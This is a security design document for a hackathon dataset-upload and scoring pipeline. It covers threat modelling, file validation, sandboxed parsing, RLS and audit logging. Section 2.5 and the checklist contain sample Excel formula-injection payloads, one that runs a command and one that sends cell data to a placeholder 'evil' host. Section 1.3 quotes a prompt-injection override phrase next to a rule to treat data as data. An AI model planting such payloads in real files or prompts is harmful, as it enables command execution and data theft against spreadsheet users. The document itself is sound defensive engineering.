# EDITH v2 — Security Architecture

> **Scope:** Dataset upload → relevance-gate → sandboxed scoring → store → public board, for the Tata Steel Hackathon (EDITH / DataForge v2).
> **Stack:** Next.js 15 (Vercel) frontend · FastAPI scorer (HF Spaces / container) · Supabase (Postgres + Storage + Auth) · `pandas`/`openpyxl`/`polars` parsers · LightGBM readiness.
> **Posture:** Defensive-only. Server-side authoritative. Defense-in-depth. No security-through-obscurity.
> **Frameworks invoked:** OWASP Top 10 (2021/2025-draft), OWASP LLM Top 10 (2025), CWE, NIST 800-53 Rev 5, MITRE ATT&CK.
> **Status:** DESIGN deliverable. Section 8 maps each control to "ship in 5 days" vs "documented + staged."

---

## 0. What EDITH v1 does today (grounding the threat model)

Read of `api/main.py` + `scorer/agent.py` shows the **current** (insecure-by-design, hackathon-v1) behavior the v2 design must replace:

| Current behavior (`main.py`) | Risk it creates |
|---|---|
| `POST /api/audit` accepts `UploadFile` with **no auth** | Anyone can upload; no per-user quota; no identity for abuse-tracking. (OWASP A01 Broken Access Control / A07) |
| File parsed by **extension sniff only** (`filename.endswith(".parquet")`) then brute-forced through `pd.read_csv` separators | No magic-byte check, no MIME check, no size cap before read. `content = await file.read()` loads **entire body into RAM** → memory-exhaustion DoS. (CWE-400, CWE-434) |
| Raw bytes written to `data/files/{audit_id}{ext}` and served back via `GET /api/datasets/{id}/file` | Stored file served to the public board verbatim — **stored XSS / CSV-injection delivery vector** if a victim opens the CSV in Excel. (CWE-1236, CWE-79) |
| Row cap (200K) applied **after** full parse | Decompression/zip-bomb and wide-column blow-ups happen during parse, before the cap helps. (CWE-409) |
| `audits.jsonl` is the only "audit log" — overwritten in full on every `_update_summary` | Not tamper-evident, races on concurrent writes, no security events. (CWE-778) |
| CORS `allow_origin_regex=https://.*\.vercel\.app` + `allow_credentials=True` | **Any** `*.vercel.app` (incl. attacker-owned previews) can make credentialed calls. (CWE-942) |
| Parsing runs in the **same process** as the API (no sandbox) | A malicious parser exploit / OOM kills the whole API. (CWE-265) |

v2 closes all of these. The relevance gate, Supabase auth, and the 5-dataset quota are new requirements layered on top.

---

## 1. Threat Model (STRIDE over the pipeline)

### 1.1 Trust boundaries

```
 [Browser / attacker]      TB1        [Vercel Edge / Next.js]    TB2     [FastAPI scorer]    TB3   [Sandbox worker]
        UNTRUSTED        ───────►        SEMI-TRUSTED          ──────►     TRUSTED-ish      ─────►   UNTRUSTED INPUT
   (forged requests,                  (SSR, route handlers,              (authoritative                (file bytes treated
    forged JWT, hostile                proxies to API)                    auth + gate)                   as hostile code)
    files, XSS payloads)
                                                                              │ TB4
                                                                              ▼
                                                                       [Supabase]
                                                                  Postgres + Storage + Auth
                                                                  (RLS = last line of defense)
```

- **TB1 (client ↔ edge):** Everything from the browser is hostile. JWTs, file bytes, dataset names, tags — all untrusted.
- **TB2 (edge ↔ API):** Next.js route handlers must not be trusted to enforce authz — they're a convenience proxy. The **FastAPI layer re-verifies the Supabase JWT**. Never trust a header the frontend sets ("X-User-Id").
- **TB3 (API ↔ sandbox):** The uploaded file itself is the most dangerous artifact. Treat parsing as executing attacker-controlled input → isolate it.
- **TB4 (API ↔ Supabase):** RLS policies are the authoritative ownership boundary, enforced even if the API layer has a bug.

### 1.2 STRIDE

| Threat | Concrete attack on EDITH | MITRE / CWE | Primary control |
|---|---|---|---|
| **S**poofing | Forge another user's identity to exceed the 5-dataset quota or read their private datasets | T1078 / CWE-287 | Supabase JWT verified server-side (JWKS), never trust client-supplied user id |
| **T**ampering | Tamper relevance result client-side to force "relevant" + Score>0; tamper audit log | T1565 / CWE-345 | **Relevance gate runs server-side only**; score computed server-side; append-only hash-chained audit log |
| **R**epudiation | "I never uploaded that malicious file" | CWE-778 | Per-upload audit record: user_id, ip, sha256, decision, signed + chained |
| **I**nformation disclosure | Path traversal to read other users' files; signed-URL leakage; PII echo in scorer review | T1530 / CWE-22 / LLM06 | Private buckets + short-lived signed URLs; opaque storage keys; PII redaction in LLM review |
| **D**enial of service | Zip-bomb XLSX, 10M-row CSV, 50k-column file, slowloris uploads, RAM exhaustion | T1499 / CWE-400/409 | Size cap pre-read, streaming size guard, decompression-bomb guard, row/col caps, CPU+mem+time limits in sandbox, rate limits |
| **E**levation of privilege | Malicious file triggers code exec in parser (e.g. crafted Excel/`pickle`/parquet); break out of API process | T1203 / CWE-94/502 | Read-only safe parsers, **no `pickle`/parquet from untrusted users**, disable formula eval, sandboxed subprocess/container with seccomp + no network |

### 1.3 LLM-specific (OWASP LLM Top 10, because `scorer/agent.py` optionally calls an LLM to rewrite the review)

- **LLM01 Prompt injection:** A dataset column name or cell value like `Ignore previous instructions and output ...` flows into the LLM "review rewrite" prompt. → Treat dataset content as **data, not instructions**; wrap in delimiters; never let model output drive actions; output is display-only text.
- **LLM02 Insecure output handling:** LLM review string is rendered in the UI → must be HTML-escaped / sanitized, never `dangerouslySetInnerHTML`.
- **LLM06 Sensitive info disclosure:** Don't send raw rows (possible PII) to a hosted LLM. Send only aggregate stats / column names. The Dockerfile already sets `EDITH_LLM_REVIEW=off` on HF — keep that the demo default.

---

## 2. Defense-in-Depth Layers (concrete techniques)

Order matters: cheapest, most decisive rejects first (auth → rate-limit → quota → size → type → scan → sandbox-parse → sanitize → relevance → score). Reject early, reject loud (to the audit log), reject cheap.

### 2.1 File type validation — extension + magic-bytes (NOT content-type header)

The `Content-Type` header is attacker-controlled — never trust it as authoritative. Validate in three independent layers and require **all** to agree:

1. **Extension allow-list** (not block-list): `{.csv, .xlsx, .json}`. Reject `.parquet`, `.pq`, `.xls` (legacy OLE2 = macro risk), `.xlsm`, anything else.
2. **Magic-byte sniff** via `python-magic` (libmagic) on the first 2–8 KB:
   - XLSX → ZIP magic `50 4B 03 04` **and** contains `[Content_Types].xml` + `xl/` entries (it's a zip; verify it's really a spreadsheet OOXML, not a renamed zip-bomb).
   - CSV / JSON → libmagic reports `text/plain`, `text/csv`, `application/json`, or `application/csv`. Reject if it sniffs as `application/x-executable`, `application/zip` (for a `.csv`), `application/pdf`, etc.
3. **Structural parse confirmation** (in sandbox, §2.14): the file must actually parse as the claimed type before it's accepted.

```python
import magic  # python-magic; binds libmagic
ALLOWED_EXT = {".csv", ".xlsx", ".json"}
SNIFF_OK = {
    ".csv":  {"text/plain", "text/csv", "application/csv", "application/octet-stream"},
    ".json": {"text/plain", "application/json"},
    ".xlsx": {"application/zip",
              "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"},
}
def validate_type(filename: str, head: bytes) -> str:
    ext = os.path.splitext(filename.lower())[1]
    if ext not in ALLOWED_EXT:
        raise Reject("UNSUPPORTED_TYPE", f"{ext} not allowed")
    sniffed = magic.from_buffer(head, mime=True)
    if sniffed not in SNIFF_OK[ext]:
        raise Reject("TYPE_MISMATCH", f"declared {ext} but bytes look like {sniffed}")
    return ext
```

> **CWE-434 Unrestricted Upload of File with Dangerous Type.** Extension + magic + structural parse = three independent checks.

### 2.2 File size validation (per-file + per-user quota)

- **Per-file hard cap: 50 MB** (generous for steel/PdM CSVs; tune down if demo data is smaller).
- **Enforce BEFORE buffering the whole body.** The v1 `await file.read()` is the bug. Stream-read in chunks, abort when the running total exceeds the cap:

```python
MAX_BYTES = 50 * 1024 * 1024
async def read_capped(upload: UploadFile) -> bytes:
    buf, total = bytearray(), 0
    while chunk := await upload.read(1 << 20):   # 1 MB chunks
        total += len(chunk)
        if total > MAX_BYTES:
            raise Reject("TOO_LARGE", f">{MAX_BYTES} bytes")
        buf += chunk
    return bytes(buf)
```

- **Edge cap too:** Vercel route handler / `next.config` body-size limit + a reverse-proxy `client_max_body_size` so the byte-count guard isn't the only line.
- **Per-user quota: max 5 datasets** — enforced **transactionally in Postgres** (count check inside the insert transaction, plus a DB-level guard so a race can't create #6). Also a **total bytes** quota (e.g. 5 × 50 MB = 250 MB/user) so 5 max-size files can't fill storage.

```sql
-- DB-level backstop for the 5-dataset rule (defense in depth vs app-layer count)
create or replace function enforce_dataset_quota() returns trigger as $$
begin
  if (select count(*) from datasets where owner = new.owner) >= 5 then
    raise exception 'QUOTA_EXCEEDED: max 5 datasets per user';
  end if;
  return new;
end; $$ language plpgsql;
create trigger trg_dataset_quota before insert on datasets
  for each row execute function enforce_dataset_quota();
```

> **CWE-400 / CWE-770 Resource exhaustion without limits.**

### 2.3 MIME validation

Covered structurally by §2.1 (magic-byte sniff is the real MIME check). Additionally: set the **response** `Content-Type` correctly and defensively when serving files back (§2.10) — always with `Content-Disposition: attachment` and `X-Content-Type-Options: nosniff` so the browser never renders a served `.csv`/`.json` inline as HTML.

### 2.4 Malware scanning

**Reality check for a 5-day hackathon on HF free tier:** a full ClamAV sidecar is the textbook answer but is heavyweight (≈1 GB RAM for `freshclam` DB; HF free Spaces are memory-constrained and ephemeral). Tiered recommendation:

| Tier | Control | When |
|---|---|---|
| **Demo-critical (ship)** | Type/magic allow-list + size caps + sandboxed read-only parse with **no execution path** (CSV/JSON/XLSX are *data*, not executables) + zip-bomb guard. For pure data files this is the dominant risk reducer — there's no exec surface if we never run macros or `pickle`. | 5 days |
| **Staged (document)** | **ClamAV via `clamd` sidecar** (`pyclamd`/`clamd` Python client → `INSTREAM` scan of the buffered bytes before parse). Run as a separate container in compose; scan returns FOUND → reject + audit. | Post-demo / when on a paid box |
| **Alternative (paid)** | Hosted scan API (e.g. VirusTotal file-report by hash for known-bad, or Cloudmersive/MetaDefender) — note rate limits + that sending customer data to a third party needs a privacy note. Hash-only lookup avoids shipping the file. | Optional |

```python
# Staged: clamd INSTREAM scan (interim is the §2.14 sandbox)
import clamd
def scan(bytes_) -> None:
    cd = clamd.ClamdNetworkSocket(host="clamav", port=3310)
    status, sig = cd.instream(io.BytesIO(bytes_))["stream"]
    if status == "FOUND":
        raise Reject("MALWARE", sig)
```

> **Honest call:** For a data-scoring demo where we never execute uploaded content, the **sandbox + format restriction + zip-bomb guard** is the genuinely load-bearing control. ClamAV is the right *production* answer and should be documented + staged, not a demo blocker.

### 2.5 CSV / Excel formula injection (CRITICAL — both on parse AND on re-export)

EDITH stores files and serves them back to the public board. A cell like `=cmd|'/c calc'!A1` or `=HYPERLINK("http://evil/?leak="&A1)` or `@SUM(...)` does nothing to us, but **detonates in the victim's Excel/Sheets** when they download from the board. This is the headline vuln for a "dataset marketplace" product.

**Defense (CWE-1236 Formula Injection):**
- **On parse:** when we read into pandas we ignore formula semantics (pandas treats cells as strings) — but we must **flag** datasets containing formula-leading cells so the board can warn, and we must never echo such a cell into HTML un-escaped.
- **On any re-export / serve:** sanitize before the bytes ever leave us. Prefix any cell beginning with `= + - @`, TAB (`0x09`), CR (`0x0D`) with a single quote `'` (the OWASP-recommended neutralizer), or wrap so the spreadsheet treats it as text.

```python
DANGEROUS_PREFIX = ("=", "+", "-", "@", "\t", "\r")
def neutralize_cell(v):
    if isinstance(v, str) and v[:1] in DANGEROUS_PREFIX:
        return "'" + v          # force text interpretation in Excel/Sheets
    return v
# Apply to every string cell on the path that re-serializes a file for download,
# and to dataset name/description/tags before they're rendered.
```

- **Best option for the board:** don't serve the raw original at all — **serve a sanitized, re-encoded CSV** generated server-side (neutralized cells, UTF-8, `QUOTE_ALL`). Keep the raw original in a private bucket for the owner only. This kills the delivery vector for everyone else.

### 2.6 SQL injection

- **Never string-build SQL.** Use the **Supabase client / PostgREST** (parameterized) or `asyncpg`/SQLAlchemy with bound parameters exclusively. No f-strings into queries.
- The relevance KB lookups (`domain_knowledge.py`) and audit writes must all go through parameterized calls.
- RLS (§2.11) means even a SQLi that slipped through can't read across users without also forging a JWT.

> **CWE-89.** Parameterized queries + ORM + least-priv DB role + RLS = four layers.

### 2.7 XSS

User-controlled strings rendered on the board: **dataset name, description, tags, original filename, and the (optional) LLM review text.**
- **Output encoding by default:** React/Next escapes JSX text — **forbid `dangerouslySetInnerHTML`** anywhere user/LLM text is shown (lint rule).
- **Sanitize on input too** (defense in depth): strip control chars, cap length (name ≤120, desc ≤2000, tag ≤40 × max 10 tags), reject/encode `<>&"'`. For any rich text, run through DOMPurify.
- **Content-Security-Policy** (Next.js `headers()` / middleware), strict:

```
Content-Security-Policy: default-src 'self';
  script-src 'self';                      /* no 'unsafe-inline'; use nonces if needed */
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https://*.supabase.co;
  connect-src 'self' https://*.supabase.co https://<api-host>;
  object-src 'none'; base-uri 'self'; frame-ancestors 'none'
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Referrer-Policy: strict-origin-when-cross-origin
```

> **CWE-79. OWASP A03.** Encode-on-output is primary; CSP + input sanitization are backstops.

### 2.8 CSRF

- Prefer **Authorization: Bearer <Supabase JWT>** for state-changing API calls (tokens in headers aren't auto-sent by the browser → not CSRF-able). If any auth ever rides in a cookie: `SameSite=Lax` (or `Strict` for mutations), `Secure`, `HttpOnly`.
- Double-submit CSRF token on cookie-auth state-changing routes; reject mismatches.
- **Tighten CORS** (the v1 `.*\.vercel\.app` + credentials is a hole): allow-list the **exact** production origin(s); for preview deploys, validate against a known set, not a wildcard regex, when `allow_credentials=True`.

> **CWE-352. OWASP A01.**

### 2.9 Rate limiting (per-IP + per-user, upload + API)

- **Mechanism:** `slowapi` (Flask-Limiter-style for FastAPI/Starlette) backed by **Redis** (Upstash free tier works on serverless) so limits are shared across replicas. Key by `user_id` when authed, else by IP (`X-Forwarded-For`, trusting only the edge proxy's appended hop).
- Suggested buckets:
  - `POST /api/audit` (upload): **5/min and 20/day per user** (also bounded by the 5-dataset quota).
  - Read endpoints: 60/min/IP.
  - Auth/login: 10/min/IP (anti-credential-stuffing).
- **Edge layer:** Vercel WAF / rate-limit rules as a coarse first net; app-layer `slowapi` as the precise one.
- Return `429` + `Retry-After`; log repeated 429s as an abuse signal.

> **CWE-770 / OWASP A04 (unrestricted resource consumption / LLM04 Model DoS).**

### 2.10 Secure file storage (Supabase Storage)

- **Private buckets only.** No public bucket for raw uploads. Storage key = `datasets/{user_id}/{uuid}` (opaque UUID, **not** the user-supplied filename → no path traversal, no name collisions, CWE-22 closed).
- **Signed URLs** for any download, **short TTL** (e.g. 60–300 s), generated server-side only after an authz check. For the *public board*, serve the **sanitized re-encoded copy** (§2.5) from a separate read-only path / public-board bucket — never the owner's raw private object.
- Never build filesystem paths from user input (the v1 `FILES_DIR / f"{audit_id}{ext}"` with `ext` from the filename is a latent traversal/extension-spoof footgun — use the stored UUID key + a server-fixed extension).
- Set `Content-Disposition: attachment`, correct `Content-Type`, `nosniff` on every served object.

> **CWE-22 Path Traversal / CWE-552. OWASP A01/A05.**

### 2.11 AuthN / AuthZ — Supabase JWT + RLS

- **AuthN:** Supabase Auth issues a JWT. **The FastAPI layer verifies it server-side** against Supabase's JWKS (RS256) or the project JWT secret — on **every** mutating route. Never trust a `user_id` sent by the client; derive it from the verified `sub` claim. Check `exp`, `aud`, `iss`.
- **AuthZ (object-level):** every dataset row has `owner uuid`. A user may read/delete only their own datasets; the board reads a **curated public projection** (score, rank, name, sanitized download) — not the private object.
- **RLS = authoritative backstop** (enforced in Postgres even if the API has a bug — OWASP A01's #1 cause is missing object-level checks):

```sql
alter table datasets enable row level security;

create policy "owner_read"   on datasets for select
  using (auth.uid() = owner);
create policy "owner_insert" on datasets for insert
  with check (auth.uid() = owner);
create policy "owner_delete" on datasets for delete
  using (auth.uid() = owner);

-- Public board sees ONLY non-sensitive, accepted, ranked rows via a view:
create view public_board as
  select id, display_name, composite_score, rank, grade, created_at
  from datasets where relevance_accepted = true and visibility = 'public';
-- service_role used by the scorer bypasses RLS; keep that key server-side ONLY.
```

- **Key hygiene:** `anon` key in the browser (RLS-gated). `service_role` key **only** in the FastAPI backend env (never shipped to the client, never in the Next.js bundle, never in git). Rotate if leaked.

> **CWE-862 Missing Authorization / CWE-639 IDOR. OWASP A01.**

### 2.12 Secure API endpoints

- **Auth on every mutating route**; schema-validate every body/query with **Pydantic v2** (already in stack) — reject unknown fields (`model_config = ConfigDict(extra="forbid")`), bound numeric ranges (e.g. `target_auc` 0.5–0.99), length-limit strings.
- Validate `label_col`/`timestamp_col` against actual columns (already done) — keep it.
- Generic error envelopes to the client (no stack traces / internal paths — v1 leaks `{type(e).__name__}: {e}`); log full detail server-side only.
- Security headers (HSTS, nosniff, frame-deny) via middleware. Pin dependency versions + run `pip-audit`/Trivy and `pnpm audit` in CI (OWASP A06 vulnerable components).

### 2.13 Audit logging for uploads

Move off the rewrite-the-whole-file `audits.jsonl` pattern (races + not tamper-evident) to an **append-only, hash-chained** security log, persisted in Postgres (`security_events` table) and mirrored to stdout for HF/Vercel log capture.

**Log per upload (and per reject):**
- `ts`, `event` (UPLOAD_ACCEPTED / REJECT_<reason> / SCAN_FOUND / QUOTA_EXCEEDED / AUTH_FAIL), `user_id`, `client_ip`, `ua`, `filename`, `declared_ext`, `sniffed_mime`, `size_bytes`, `sha256` of bytes, `relevance_decision` + score, `composite_score` (or 0), `audit_id`, `latency_ms`.
- **Never log file contents or PII rows.** Hash, don't store, the bytes for repudiation defense.
- **Tamper-evidence:** each row stores `prev_hash`; `row_hash = sha256(prev_hash || canonical(row))`. Any deletion/edit breaks the chain → detectable. (For a hackathon this is a nice "we thought about integrity" signal; full WORM/Rekor is staged.)

> **CWE-778 Insufficient Logging. OWASP A09. NIST AU-2/AU-9.**

### 2.14 Upload sandboxing before analysis (the core control)

Treat the uploaded file as **hostile input being executed by the parser**. Isolate parsing + scoring from the API process.

**Isolation model (recommended for v2):** run parse+score in a **separate short-lived subprocess** (demo-feasible) and, for production, a **separate container** with:
- **No network** (`--network none` / seccomp; so a crafted file can't trigger SSRF/exfil via a parser's URL features, e.g. `pd.read_*` URL fetch, Excel external links).
- **Resource limits:** `RLIMIT_AS` (memory, e.g. 1–2 GB), `RLIMIT_CPU`, `RLIMIT_FSIZE`, `RLIMIT_NOFILE`; container `--memory`, `--cpus`, `--pids-limit`. Read-only root FS + a small tmpfs scratch.
- **Wall-clock timeout** (e.g. 30–60 s) → kill on overrun → reject as `PARSE_TIMEOUT`.
- **Drop privileges:** non-root (Dockerfile already uses uid 1000 — keep), seccomp default profile, `no-new-privileges`.

```python
# Demo-feasible subprocess sandbox skeleton
import resource, multiprocessing as mp
def _limits():
    GB = 1024**3
    resource.setrlimit(resource.RLIMIT_AS,    (2*GB, 2*GB))
    resource.setrlimit(resource.RLIMIT_CPU,   (45, 50))
    resource.setrlimit(resource.RLIMIT_FSIZE, (100*1024*1024,)*2)
def parse_and_score(path, q):           # runs in child
    _limits()
    df = safe_read(path)                # §below
    q.put(score(df))
def run_sandboxed(path, timeout=60):
    q = mp.Queue(); p = mp.Process(target=parse_and_score, args=(path, q))
    p.start(); p.join(timeout)
    if p.is_alive(): p.terminate(); raise Reject("PARSE_TIMEOUT")
    if p.exitcode != 0: raise Reject("PARSE_CRASH")
    return q.get()
```

**Safe parser rules (`safe_read`):**
- **CSV:** `pandas.read_csv(..., engine="c", dtype=str-by-default-then-coerce, nrows=ROW_CAP, on_bad_lines="skip")`; **disable URL fetch** (only accept a local path, never a string that could be a URL); reject if `df.shape[1] > COL_CAP` (e.g. 2000 cols) — wide-CSV blow-up guard.
- **XLSX:** `openpyxl` with **`read_only=True, data_only=True`** → `data_only` returns the **cached value, never evaluates formulas** (kills formula-eval RCE class); reject workbooks with VBA (`.xlsm`) and external links; cap rows/cols/sheets.
- **JSON:** size-cap + max nesting depth + use `json` (not `eval`); reject if expands to > N rows/keys.
- **Never** `pickle`, `parquet`, `feather`, `np.load(allow_pickle=True)`, or HDF5 from untrusted users → arbitrary-code-exec deserialization classes (CWE-502). v1 accepted parquet — **drop it** for untrusted upload.
- **Zip / decompression bomb guard (XLSX is a zip):** before extracting, inspect the zip central directory; reject if **uncompressed_size / compressed_size ratio > 100** or total uncompressed > a cap (e.g. 500 MB), or member count is absurd. (CWE-409.)

```python
import zipfile
def zipbomb_check(path, max_ratio=100, max_total=500*1024**2):
    with zipfile.ZipFile(path) as z:
        total = sum(i.file_size for i in z.infolist())
        comp  = sum(i.compress_size for i in z.infolist()) or 1
        if total > max_total or total/comp > max_ratio:
            raise Reject("ZIP_BOMB")
```

- **Row/col caps** applied *inside* the sandbox **during** read (`nrows=`), not after — so the bomb never fully materializes (fixes v1's "cap after parse" bug).

> **CWE-94/502/409/400/265. OWASP A05/A08. MITRE T1203.**

### 2.15 Relevance gate — bypass-proof (LOCKED requirement #1)

The hybrid (domain-KB vocab + embedding-to-PS) relevance engine is **the gate that sets Score=0 / Rank=0** for off-topic datasets. It must be **server-side authoritative and unforgeable**:

- **Computed only in the FastAPI/sandbox layer**, after parse, from the **actual file contents** — never from any client-supplied flag, score, or header. The client cannot send `relevant=true`.
- The relevance decision, the threshold, and the resulting score are **all** server-derived. The API response *reports* the decision; it never *accepts* one.
- **Persist the decision server-side** (`relevance_accepted bool`, `relevance_score float`) and have the **DB/board view filter on the stored server value** (`where relevance_accepted = true`), so even a tampered API response can't surface a rejected dataset on the board.
- **Reject path is explicit and terminal:** below threshold → `relevance_accepted=false`, `composite_score=0`, `rank=0`, message *"Dataset is not relevant to the Tata Steel Hackathon."* — and the dataset is **not** scored further, **not** ranked, **not** published. (Saves compute + denies the off-topic uploader a free board slot.)
- **Anti-gaming notes:** keyword-stuffing a few Tata/steel terms into column names is mitigated by the hybrid design (embedding-to-PS similarity + KB coverage, not a single keyword OR). Document the threshold but don't expose the exact scoring internals in client responses (avoid handing attackers a gradient to optimize against — this is *minimizing attack surface*, not security-through-obscurity, since the gate's correctness doesn't depend on secrecy).
- The relevance score itself is **not** user-controllable input to authz — it only gates publication, so even a perfect bypass yields a low-quality off-topic dataset on the board, not a privilege escalation.

> **Tampering (STRIDE-T) / CWE-602 Client-Side Enforcement of Server-Side Security.** Authority lives on the server + in the DB view.

---

## 3. Validation Flow Diagram

```mermaid
flowchart TD
    A[POST /api/audit + file + Bearer JWT] --> B{1. AuthN: verify Supabase JWT (JWKS, exp/aud/iss)}
    B -- invalid --> RJ1[401 AUTH_FAIL · audit log]
    B -- valid --> C{2. Rate limit (per-user 5/min, per-IP)}
    C -- exceeded --> RJ2[429 RATE_LIMIT + Retry-After · audit log]
    C -- ok --> D{3. Quota: user dataset count < 5 ? (DB trigger backstop)}
    D -- >=5 --> RJ3[409 QUOTA_EXCEEDED · audit log]
    D -- ok --> E{4. Size guard (streamed, <=50MB before buffering)}
    E -- too big --> RJ4[413 TOO_LARGE · audit log]
    E -- ok --> F{5. Type: ext allow-list + magic-byte/MIME sniff agree?}
    F -- mismatch --> RJ5[415 TYPE_MISMATCH · audit log]
    F -- ok --> G{6. Malware scan (staged ClamAV; interim = format+sandbox)}
    G -- FOUND --> RJ6[422 MALWARE · audit log]
    G -- clean --> H{7. Zip-bomb / decompression-ratio guard (xlsx)}
    H -- bomb --> RJ7[422 ZIP_BOMB · audit log]
    H -- ok --> I[8. SANDBOX: subprocess, no-net, mem/cpu/time caps]
    I --> J{Safe parse: read_only/data_only, nrows/cols cap, no pickle}
    J -- crash/timeout --> RJ8[422 PARSE_FAIL/TIMEOUT · audit log]
    J -- parsed df --> K[9. Injection sanitize: neutralize formula cells; sanitize name/desc/tags]
    K --> L{10. RELEVANCE GATE (server-side, hybrid KB+embedding)}
    L -- below threshold --> RJ9[ACCEPTED-as-row but Score=0 / Rank=0 / not published\n message: 'Dataset is not relevant to the Tata Steel Hackathon' · audit log]
    L -- relevant --> M[11. SCORE: 10 dims + domain_pdm + readiness (in sandbox)]
    M --> N[12. STORE: private bucket key datasets/{uid}/{uuid}; row owner=auth.uid; relevance_accepted=true]
    N --> O[13. AUDIT LOG: hash-chained UPLOAD_ACCEPTED row]
    O --> P[200: AuditResult + signed-URL (owner) / sanitized copy (board)]

    RJ1 & RJ2 & RJ3 & RJ4 & RJ5 & RJ6 & RJ7 & RJ8 --> Z[(security_events: append-only, hash-chained)]
    RJ9 --> Z
    O --> Z
```

Key property: **every reject branch writes to the audit log**, and the relevance reject is a *first-class outcome* (row persisted with Score=0/Rank=0, not published) — not an error.

---

## 4. Vulnerability Prevention Checklist

| Vuln | Vector | Control | Where enforced | OWASP | Demo-critical? |
|---|---|---|---|---|---|
| Unrestricted file type | Renamed `.exe`/`.parquet`/`.xlsm` as `.csv` | Ext allow-list + libmagic sniff + structural parse; drop parquet/pickle/xls | API §2.1 + sandbox §2.14 | A05/A08 (CWE-434) | **Y** |
| Memory-exhaustion DoS | 10M-row CSV, `await file.read()` whole body | Streamed size cap (50MB) before buffer; row/col caps during read | API §2.2/§2.14 | A04 (CWE-400) | **Y** |
| Decompression / zip bomb | Crafted XLSX (zip) explodes on extract | Compression-ratio + total-uncompressed guard before parse | Sandbox §2.14 | A05 (CWE-409) | **Y** |
| Parser RCE / deserialization | Malicious xlsx formula eval, pickle/parquet load | `openpyxl data_only/read_only`, no pickle/parquet, no-network subprocess sandbox | Sandbox §2.14 | A08 (CWE-502/94) | **Y** |
| **CSV/Excel formula injection** | `=cmd\|...`, `@`, `+`, `-`, TAB, CR cells detonate in victim Excel | Neutralize leading char with `'` on serve/export; serve sanitized re-encoded copy on board | API §2.5 (serve + render) | A03 (CWE-1236) | **Y** |
| SQL injection | Malicious dataset name/tag into query | Parameterized Supabase client / bound params; never string-build SQL | API/DB §2.6 | A03 (CWE-89) | **Y** |
| Stored / reflected XSS | `<script>` in name/desc/tag/LLM review on board | React output-encoding (no `dangerouslySetInnerHTML`) + input sanitize + CSP | Web §2.7 | A03 (CWE-79) | **Y** |
| CSRF | Forged state-changing request | Bearer-token auth (not cookie) + SameSite + tightened CORS allow-list | API/Web §2.8 | A01 (CWE-352) | Y (cheap) |
| Broken access control / IDOR | Read/delete another user's dataset; exceed quota | JWT-derived `user_id` + RLS owner policies + DB quota trigger | API/DB §2.11/§2.2 | A01 (CWE-639/862) | **Y** |
| Path traversal | `../` in filename → storage key | Opaque UUID storage keys, server-fixed ext, never build path from filename | Storage §2.10 | A01 (CWE-22) | **Y** |
| Signed-URL / file leakage | Public bucket / long-lived URL | Private buckets, short-TTL signed URLs, board serves sanitized copy only | Storage §2.10 | A01/A05 (CWE-552) | Y |
| Relevance-gate bypass | Client forges `relevant=true` / score | Server-side-only gate; DB stores decision; board view filters on stored value | API/DB §2.15 | A04 (CWE-602) | **Y** |
| Rate-limit abuse / brute force | Upload flood, auth stuffing | `slowapi`+Redis per-user/per-IP + edge WAF; 429 + Retry-After | API/Edge §2.9 | A04 (CWE-770) | Y |
| Insufficient logging | Can't trace/repudiate malicious upload | Hash-chained `security_events`, log all accepts+rejects, no PII | API/DB §2.13 | A09 (CWE-778) | Y (cheap) |
| CORS misconfig | Any `*.vercel.app` w/ credentials | Exact-origin allow-list when `allow_credentials=True` | API §2.8 | A05 (CWE-942) | Y (cheap) |
| Sensitive error leakage | Stack traces / paths to client | Generic error envelope; detail server-side only | API §2.12 | A05 (CWE-209) | Y (cheap) |
| Vulnerable dependencies | Outdated pandas/openpyxl/Next | Pin versions + `pip-audit`/Trivy + `pnpm audit` in CI | CI §2.12 | A06 | Stage |
| **LLM01** Prompt injection | Dataset cell/colname into review-rewrite prompt | Content as data (delimited), output display-only, no action from output | Scorer §1.3 | LLM01 | Y (if LLM on) |
| **LLM02** Insecure output handling | LLM review rendered as HTML | Escape/sanitize review; never raw-HTML inject | Web §1.3/§2.7 | LLM02 | Y (if LLM on) |
| **LLM06** Sensitive info disclosure | Raw PII rows sent to hosted LLM | Send aggregates/colnames only; `EDITH_LLM_REVIEW=off` default | Scorer §1.3 | LLM06 | Y (if LLM on) |
| Malware delivery | Infected file served from board | ClamAV scan (staged) + format restriction + serve sanitized copy (interim) | API §2.4 | A08 | Stage (interim ships) |

---

## 5. Free-Tier Reality + Staging (what to actually ship by 15 Jun)

**Guiding principle:** for a *data-scoring* product that never executes uploaded content, the load-bearing controls are **format restriction + sandboxed safe-parse + size/bomb caps + formula-injection neutralization + server-side relevance gate + RLS authz**. Those are cheap and decisive. The heavyweight infra (ClamAV, WORM logs, full container-per-upload) is genuinely *production* hardening — document it, stage it, ship a safe interim.

### 5.1 Ship in 5 days (demo-critical, low effort, high payoff)
1. **Supabase Auth + JWT verify server-side + RLS owner policies + 5-dataset quota** (DB trigger). — closes A01, the #1 risk.
2. **Streamed size cap (50MB) + row/col caps during read.** — kills the v1 RAM-DoS.
3. **Ext allow-list + `python-magic` sniff; drop parquet/pickle/xls.** — closes CWE-434/502.
4. **Subprocess sandbox** (no-network, `RLIMIT_AS`/CPU, wall-clock timeout) + **`openpyxl read_only/data_only`** + **zip-bomb ratio guard.** — closes the parser-RCE/bomb classes. Subprocess is demo-feasible; full container is staged.
5. **Formula-injection neutralization on serve/render + serve sanitized re-encoded copy on the board.** — closes the headline CWE-1236.
6. **Server-side relevance gate authority + DB-stored decision + board view filters on stored value.** — locked requirement, bypass-proof.
7. **Output-encoding + CSP + no `dangerouslySetInnerHTML` + input length caps.** — closes XSS cheaply.
8. **Tighten CORS to exact origins; generic error envelopes; Pydantic `extra="forbid"`.** — cheap config wins.
9. **Hash-chained `security_events` logging of accepts + every reject.** — cheap, strong audit story for judges.
10. **`slowapi` per-user/IP rate limits** (Redis/Upstash free tier).

### 5.2 Document + stage (right answer, not a demo blocker)
- **Full ClamAV `clamd` sidecar.** Interim = format restriction + sandbox + bomb guard (no exec surface on pure data). Stage when on a paid/persistent box.
- **Container-per-upload (gVisor/Firecracker)** instead of subprocess. Interim = `multiprocessing` + rlimits + seccomp.
- **WORM / Rekor-anchored audit log** + SIEM shipping. Interim = Postgres hash-chain + stdout capture.
- **Hosted malware/AV API + dependency CVE gating in CI** (`pip-audit`, Trivy, `pnpm audit`, Dependabot).
- **WAF (Vercel/Cloudflare) managed rules** in front of edge.

### 5.3 Honest "overkill for a hackathon" calls
